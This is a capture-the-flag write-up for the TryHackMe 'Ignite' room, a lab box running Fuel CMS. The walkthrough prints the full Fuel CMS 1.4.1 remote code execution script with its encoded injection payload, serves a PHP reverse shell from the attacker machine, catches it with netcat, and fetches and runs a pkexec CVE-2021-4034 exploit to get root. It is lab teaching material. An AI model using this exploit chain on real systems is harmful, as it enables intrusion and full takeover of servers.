## Ignite
https://tryhackme.com/room/ignite

### Enum
```
nmap -sC -sV -T4 10.10.120.220 -vv

PORT   STATE SERVICE REASON         VERSION
80/tcp open  http    syn-ack ttl 61 Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 1 disallowed entry
|_/fuel/
|_http-title: Welcome to FUEL CMS
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 (Ubuntu)
```

![image](https://user-images.githubusercontent.com/6504854/179013810-96873376-b3e6-48fb-b648-b49ed2e56201.png)

```
searchsploit FUEL CMS

--------------------------------------------------------------- ---------------------------------
 Exploit Title                                                 |  Path
--------------------------------------------------------------- ---------------------------------
fuel CMS 1.4.1 - Remote Code Execution (1)                     | linux/webapps/47138.py
Fuel CMS 1.4.1 - Remote Code Execution (2)                     | php/webapps/49487.rb
Fuel CMS 1.4.1 - Remote Code Execution (3)                     | php/webapps/50477.py
Fuel CMS 1.4.13 - 'col' Blind SQL Injection (Authenticated)    | php/webapps/50523.txt
Fuel CMS 1.4.7 - 'col' SQL Injection (Authenticated)           | php/webapps/48741.txt
Fuel CMS 1.4.8 - 'fuel_replace_id' SQL Injection (Authenticate | php/webapps/48778.txt
Fuel CMS 1.5.0 - Cross-Site Request Forgery (CSRF)             | php/webapps/50884.txt
--------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```
```
searchsploit -x 47138.py

Exploit: fuel CMS 1.4.1 - Remote Code Execution (1)
      URL: https://www.exploit-db.com/exploits/47138
     Path: /usr/share/exploitdb/exploits/linux/webapps/47138.py
File Type: Python script, ASCII text executable
```
```
cp /usr/share/exploitdb/exploits/linux/webapps/47138.py 47138.py
vi 47138.py
```
```
# Exploit Title: fuel CMS 1.4.1 - Remote Code Execution (1)
# Date: 2019-07-19
# Exploit Author: 0xd0ff9
# Vendor Homepage: https://www.getfuelcms.com/
# Software Link: https://github.com/daylightstudio/FUEL-CMS/releases/tag/1.4.1
# Version: <= 1.4.1
# Tested on: Ubuntu - Apache2 - php5
# CVE : CVE-2018-16763


import requests
import urllib

#url = "http://127.0.0.1:8881"
url = "http://10.10.120.220:80"
def find_nth_overlapping(haystack, needle, n):
    start = haystack.find(needle)
    while start >= 0 and n > 1:
        start = haystack.find(needle, start+1)
        n -= 1
    return start

while 1:
	xxxx = raw_input('cmd:')
	burp0_url = url+"/fuel/pages/select/?filter=%27%2b%70%69%28%70%72%69%6e%74%28%24%61%3d%27%73%79%73%74%65%6d%27%29%29%2b%24%61%28%27"+urllib.quote(xxxx)+"%27%29%2b%27"
	proxy = {"http":"http://127.0.0.1:8080"}
	r = requests.get(burp0_url, proxies=proxy)

	html = "<!DOCTYPE html>"
	htmlcharset = r.text.find(html)

	begin = r.text[0:20]
	dup = find_nth_overlapping(r.text,begin,2)

	print (r.text[0:dup])
```

![image](https://user-images.githubusercontent.com/6504854/179014084-39303845-742a-4bf6-988c-aef880aa10d4.png)

I runned Burp Proxy 8080..
python2 47138.py

![image](https://user-images.githubusercontent.com/6504854/179014686-2220414b-d0cb-455d-8174-2608b10c680d.png)

🏴OK. I injected RCE.

```
python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.128.199 - - [14/Jul/2022 23:29:13] "GET /1.php HTTP/1.1" 200 -
10.10.128.199 - - [14/Jul/2022 23:29:15] "GET /1.php HTTP/1.1" 200 -
```

![image](https://user-images.githubusercontent.com/6504854/179015523-ce9ca787-4631-4364-9093-35af65b0d49b.png)

![image](https://user-images.githubusercontent.com/6504854/179015785-05d69009-0e23-450b-a8c2-c304a0ac7932.png)

1.php is Revers-Shell(@Penetest Monkey 🐵).

https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php

なんかいっぱいできるがヨシ 🐱ﾖｼ

### Flag
```
nc　-lnvp 4444
curl http://10.10.120.220/1.php
```

```
nc -lnvp 4444
listening on [any] 4444 ...
connect to [10.4.63.222] from (UNKNOWN) [10.10.128.199] 57900
Linux ubuntu 4.15.0-45-generic #48~16.04.1-Ubuntu SMP Tue Jan 29 18:03:48 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
 07:29:41 up 11 min,  0 users,  load average: 2.03, 0.89, 0.53
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ python3 -c "import pty;pty.spawn('/bin/bash')";
www-data@ubuntu:/$ sudo -l
[sudo] password for www-data:
```
😿


```
www-data@ubuntu:/$ ls -la /usr/bin/pkexec
ls -la /usr/bin/pkexec
-rwsr-xr-x 1 root root 23376 Jan 15  2019 /usr/bin/pkexec
```
😼 -rwsr-xr-x

Polkit.tar is CVE-2021-4034 exploit and made it tarball.

https://github.com/berdav/CVE-2021-4034

```
www-data@ubuntu:$ cd /tmp 
www-data@ubuntu:/tmp$ wget http://10.4.63.222/polkit.tar
--2022-07-14 07:36:47--  http://10.4.63.222/polkit.tar
Connecting to 10.4.63.222:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 235520 (230K) [application/x-tar]
Saving to: 'polkit.tar'

polkit.tar          100%[===================>] 230.00K   114KB/s    in 2.0s

2022-07-14 07:36:50 (114 KB/s) - 'polkit.tar' saved [235520/235520]

www-data@ubuntu:/tmp$ tar -xvf polkit.tar
www-data@ubuntu:/tmp$ cd CVE-2021-4034
www-data@ubuntu:/tmp/CVE-2021-4034$ ./cve-2021-4034
./cve-2021-4034
# id
id
uid=0(root) gid=0(root) groups=0(root),33(www-data)
```

😸Thank you for your time. Enjoy!


